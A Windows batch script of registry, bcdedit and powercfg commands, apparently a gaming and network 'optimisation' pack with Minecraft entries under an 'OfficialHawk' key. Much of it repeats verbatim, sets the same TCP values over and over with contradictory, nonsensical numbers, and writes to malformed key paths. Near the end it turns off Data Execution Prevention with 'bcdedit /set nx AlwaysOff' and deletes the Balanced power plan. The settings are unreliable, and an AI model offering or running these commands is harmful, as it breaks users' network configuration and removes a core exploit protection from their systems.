Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DontAddDefaultGatewayDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPMaxDataRetransmissions" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "5220" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "5156" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DnsPriority" /t REG_DWORD /d "1469" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "HostsPriority" /t REG_DWORD /d "572" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "LocalPriority" /t REG_DWORD /d "91" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NetbtPriority" /t REG_DWORD /d "45" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "QualifyingDestinationThreshold" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IPEnableRouter" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveTime" /t REG_DWORD /d "7200000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DontAddDefaultGatewayDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPMaxDataRetransmissions" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "5216" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "5156" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "368" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "64000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "301" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "155903" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_SZ /d "" /f
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "200" /f
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "MaximumSpeed" /t REG_SZ /d "5000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Print" /v "PortThreadPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Print" /v "PriorityClass" /t REG_DWORD /d "1" /f
:: ---------------------------------------------------  !!! Incorrect Data Found !!!  -------------------------------------------------------------
:: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters --> TcpTimedWaitDelay" dword:30
:: HKEY_LOCAL_MACHINE\SYSTEM\Microsoft/Windows/CurrentVersion/Internet Settings --> MaxConnectionsPerServer" =dword:00000010
:: HKEY_LOCAL_MACHINE\SYSTEM\Microsoft/Windows/CurrentVersion/Internet Settings --> MaxConnectionsPer1_0Server" =dword:00000010
:: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip/Tcpip/QoS --> Do not use NLA ="1"
:: ------------------------------------------------------------------------------------------------------------------------------------------------

Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\Microsoft/Windows/CurrentVersion/Internet Settings" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip/Tcpip/QoS" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.7.10" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\USER\AppData\Roaming\.minecraft\versions\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TcpAckFrequency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MTU" /t REG_DWORD /d "5207" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MSS" /t REG_DWORD /d "1337" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IRPStackSize" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "95268" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.9.4" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\Users\Owner\AppData\Roaming\.minecraft\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxFreeTcbs" /t REG_DWORD /d "415030" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "95520" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultRCVWindow" /t REG_DWORD /d "94258" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPerServer" /t REG_DWORD /d "22" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "22" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.9.4" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\Users\Owner\AppData\Roaming\.minecraft\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxFreeTcbs" /t REG_DWORD /d "415030" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "415029" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultRCVWindow" /t REG_DWORD /d "94258" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPerServer" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DnsPriority" /t REG_DWORD /d "1469" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "HostsPriority" /t REG_DWORD /d "572" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "LocalPriority" /t REG_DWORD /d "91" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NetbtPriority" /t REG_DWORD /d "45" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "QualifyingDestinationThreshold" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IPEnableRouter" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveTime" /t REG_DWORD /d "7200000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DontAddDefaultGatewayDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPMaxDataRetransmissions" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "5220" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "5156" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DnsPriority" /t REG_DWORD /d "1469" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "HostsPriority" /t REG_DWORD /d "572" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "LocalPriority" /t REG_DWORD /d "91" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NetbtPriority" /t REG_DWORD /d "45" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "QualifyingDestinationThreshold" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IPEnableRouter" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveTime" /t REG_DWORD /d "7200000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DontAddDefaultGatewayDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPMaxDataRetransmissions" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "5216" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "5156" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "368" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "64000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "301" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "155903" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_SZ /d "" /f
bcdedit /set useplatformtick yes

bcdedit /set useplatformclock false

bcdedit /set nx AlwaysOff

bcdedit /set tscsyncpolicy Enhanced
powercfg -delete 381b4222-f694-41f0-9685-ff5bb260df2e
